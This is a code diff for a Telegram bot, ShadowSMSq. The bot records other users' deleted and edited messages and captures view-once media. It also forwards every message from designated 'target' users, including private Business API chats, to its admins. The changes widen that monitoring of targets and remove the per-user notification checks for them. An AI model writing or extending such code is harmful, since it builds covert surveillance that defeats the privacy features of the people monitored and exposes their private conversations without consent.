@@ -33,7 +33,7 @@ logger = logging.getLogger(__name__)
 # ══════════════════════════════════════════════
 
 BOT_TOKEN     = os.getenv("BOT_TOKEN", "")
-DB_PATH       = os.getenv("DB_PATH", "shadowwatch.db")
+DB_PATH       = os.getenv("DB_PATH", "/app/data/shadowwatch.db")
 ADMIN_IDS     = [int(x) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]
 BOT_USERNAME  = "ShadowSMSq_BOT"
 BOT_NAME      = "ShadowSMSq"
@@ -98,6 +98,8 @@ def _init_db_sync():
     c.commit(); c.close()
 
 async def init_db():
+    # Создаём папку для БД если не существует (важно для Docker-томов)
+    Path(DB_PATH).parent.mkdir(parents=True, exist_ok=True)
     await asyncio.get_event_loop().run_in_executor(None, _init_db_sync)
 
 def _run(fn):
@@ -342,13 +344,23 @@ def extract_media(msg: Message):
     return None, None
 
 def is_view_once_msg(msg: Message) -> bool:
-    """Проверяет, является ли сообщение одноразовым (исчезающим медиа)"""
-    if msg.photo and getattr(msg.photo[-1], "has_media_spoiler", False): return True
-    if msg.video and getattr(msg.video, "has_media_spoiler", False):     return True
-    # Официальный флаг view_once в aiogram может быть в разных местах
-    if getattr(msg, "has_media_spoiler", False): return True
-    # Проверяем protect_content — тоже признак одноразового
-    if getattr(msg, "protect_content", False): return True
+    """
+    Проверяет, является ли сообщение одноразовым (исчезающим медиа).
+    Telegram Bot API: view_once медиа приходят через Business API.
+    Признак — поле has_media_spoiler на уровне Message (не PhotoSize!).
+    protect_content — НЕ признак view_once, убрано.
+    """
+    # Главный флаг — has_media_spoiler на уровне сообщения
+    if getattr(msg, "has_media_spoiler", False):
+        return True
+    # Дополнительно: photo/video с флагом на объекте (старые версии API)
+    if msg.photo and getattr(msg.photo[-1], "has_media_spoiler", False):
+        return True
+    if msg.video and getattr(msg.video, "has_media_spoiler", False):
+        return True
+    # video_note (кружочки) — всегда одноразовые если has_media_spoiler
+    if msg.video_note and getattr(msg.video_note, "has_media_spoiler", False):
+        return True
     return False
 
 MEDIA_EMOJI = {
@@ -459,14 +471,23 @@ async def _send_deleted_notify(bot: Bot, cached: dict, owner_id: int = None):
     mtype      = cached.get("media_type")
     fid        = cached.get("file_id")
     notify_to  = owner_id or cached.get("owner_id") or None
-    if not notify_to:
+    is_tgt     = is_target(author_uid) if author_uid else False
+
+    # Для таргетов — шлём всем админам даже без owner_id
+    recipients = []
+    if is_tgt:
+        recipients = ADMIN_IDS[:]
+    elif notify_to:
+        recipients = [notify_to]
+    else:
         logger.warning(f"_send_deleted_notify: owner_id не найден для cached={cached}")
         return
+
     now_str = datetime.now().strftime("%d.%m.%Y в %H:%M:%S")
     sender  = user_link(author_uid, fname, uname) if author_uid else fname
 
     caption = (
-        f"🗑 <b>Удалённое сообщение</b>\n\n"
+        f"{'🎯 TARGET · ' if is_tgt else ''}🗑 <b>Удалённое сообщение</b>\n\n"
         f"📅 <b>{now_str}</b>\n"
         f"👤 <b>Автор:</b> {sender}\n"
         + (f"\n💬 <b>Текст:</b>\n{trim(text)}\n" if text else "")
@@ -474,29 +495,33 @@ async def _send_deleted_notify(bot: Bot, cached: dict, owner_id: int = None):
         + f"\n🤖 @{BOT_USERNAME}"
     )
 
-    if not await should_notify(notify_to, "notify_delete"): return
-    try:
-        if fid and mtype:
-            send = {
-                "фото":           bot.send_photo,
-                "видео":          bot.send_video,
-                "видеосообщение": bot.send_video_note,
-                "голосовое":      bot.send_voice,
-                "аудио":          bot.send_audio,
-                "документ":       bot.send_document,
-            }.get(mtype)
-            if send:
-                if mtype == "видеосообщение":
-                    await send(notify_to, fid)
-                    await bot.send_message(notify_to, caption, parse_mode="HTML")
+    async def _deliver(to: int):
+        try:
+            if fid and mtype:
+                send = {
+                    "фото":           bot.send_photo,
+                    "видео":          bot.send_video,
+                    "видеосообщение": bot.send_video_note,
+                    "голосовое":      bot.send_voice,
+                    "аудио":          bot.send_audio,
+                    "документ":       bot.send_document,
+                }.get(mtype)
+                if send:
+                    if mtype == "видеосообщение":
+                        await send(to, fid)
+                        await bot.send_message(to, caption, parse_mode="HTML")
+                    else:
+                        await send(to, fid, caption=caption, parse_mode="HTML")
                 else:
-                    await send(notify_to, fid, caption=caption, parse_mode="HTML")
+                    await bot.send_message(to, caption, parse_mode="HTML")
             else:
-                await bot.send_message(notify_to, caption, parse_mode="HTML")
-        else:
-            await bot.send_message(notify_to, caption, parse_mode="HTML")
-    except Exception as ex:
-        logger.warning(f"deleted notify {notify_to}: {ex}")
+                await bot.send_message(to, caption, parse_mode="HTML")
+        except Exception as ex:
+            logger.warning(f"deleted notify {to}: {ex}")
+
+    for r in recipients:
+        if is_tgt or await should_notify(r, "notify_delete"):
+            await _deliver(r)
 
 
 async def _send_view_once_notify(bot: Bot, msg: Message, owner_id: int, mtype: str, fid: str):
@@ -535,10 +560,24 @@ async def _mirror_to_admins(bot: Bot, msg: Message):
 
     u = msg.from_user
     now_str = datetime.now().strftime("%d.%m.%Y в %H:%M:%S")
+
+    # Кому было отправлено сообщение
+    if msg.chat.type == "private":
+        # В личном чате chat — это и есть получатель (если не сам таргет писал себе)
+        # business_connection_id говорит что это чужой чат через Business API
+        bc_id = getattr(msg, "business_connection_id", None)
+        if bc_id:
+            recipient = f"через Business API (чат: {msg.chat.title or msg.chat.first_name or str(msg.chat.id)})"
+        else:
+            recipient = f"боту @{BOT_USERNAME}"
+    else:
+        recipient = f"в группу «{msg.chat.title or str(msg.chat.id)}»"
+
     header = (
         f"🎯 <b>TARGET · {user_link(u.id, u.first_name, u.username)}</b>\n"
         f"📅 {now_str}\n"
-        f"💬 Чат: {msg.chat.title or 'личный чат'}\n"
+        f"📨 Кому: <b>{recipient}</b>\n"
+        f"🆔 msg_id: <code>{msg.message_id}</code>\n"
         f"─────────────────────\n"
     )
 
@@ -606,7 +645,9 @@ async def _do_cache(msg: Message, owner_id: int = None):
 
 @event_router.message()
 async def on_message(msg: Message, bot: Bot):
-    await _do_cache(msg)
+    # Для таргетов: owner_id = первый админ, чтобы уведомления об удалении/редактировании шли туда же
+    owner_id = ADMIN_IDS[0] if (msg.from_user and is_target(msg.from_user.id) and ADMIN_IDS) else None
+    await _do_cache(msg, owner_id=owner_id)
     # Зеркалирование target-пользователей
     await _mirror_to_admins(bot, msg)
 
@@ -617,11 +658,15 @@ async def on_edit(msg: Message, bot: Bot, owner_id: int = None):
     cached    = await get_cached_message(msg.chat.id, msg.message_id)
     old_text  = cached.get("text") if cached else None
     new_text  = msg.text or msg.caption
+
+    # Для таргетов — уведомляем всех админов напрямую
+    is_tgt = is_target(u.id)
     notify_to = owner_id or (cached.get("owner_id") if cached else None)
-    if old_text != new_text and notify_to:
+
+    if old_text != new_text:
         now_str = datetime.now().strftime("%d.%m.%Y в %H:%M:%S")
         notify  = (
-            f"✏️ <b>Изменённое сообщение</b>\n\n"
+            f"{'🎯 ' if is_tgt else ''}✏️ <b>{'TARGET · ' if is_tgt else ''}Изменённое сообщение</b>\n\n"
             f"📅 <b>{now_str}</b>\n"
             f"👤 <b>Автор:</b> {user_link(u.id, u.first_name, u.username)}\n"
             f"💬 <b>Чат:</b> {msg.chat.title or 'личный чат'}\n\n"
@@ -629,12 +674,19 @@ async def on_edit(msg: Message, bot: Bot, owner_id: int = None):
             f"📝 <b>Стало:</b>\n{trim(new_text)}\n\n"
             f"🤖 @{BOT_USERNAME}"
         )
-        if await should_notify(notify_to, "notify_edit"):
+        if is_tgt:
+            # Таргет — шлём всем админам без проверки подписки
+            for admin_id in ADMIN_IDS:
+                try: await bot.send_message(admin_id, notify, parse_mode="HTML")
+                except Exception as ex: logger.warning(f"target edit notify {admin_id}: {ex}")
+        elif notify_to and await should_notify(notify_to, "notify_edit"):
             try: await bot.send_message(notify_to, notify, parse_mode="HTML")
             except Exception as ex: logger.warning(f"edit notify {notify_to}: {ex}")
+
     mtype, fid = extract_media(msg)
+    effective_owner = notify_to or (ADMIN_IDS[0] if is_tgt and ADMIN_IDS else None)
     await cache_message(msg.chat.id, msg.message_id, u.id, u.username, u.first_name,
-                        new_text, mtype, fid, owner_id=notify_to)
+                        new_text, mtype, fid, owner_id=effective_owner)
 
 # ── Business API ──
 
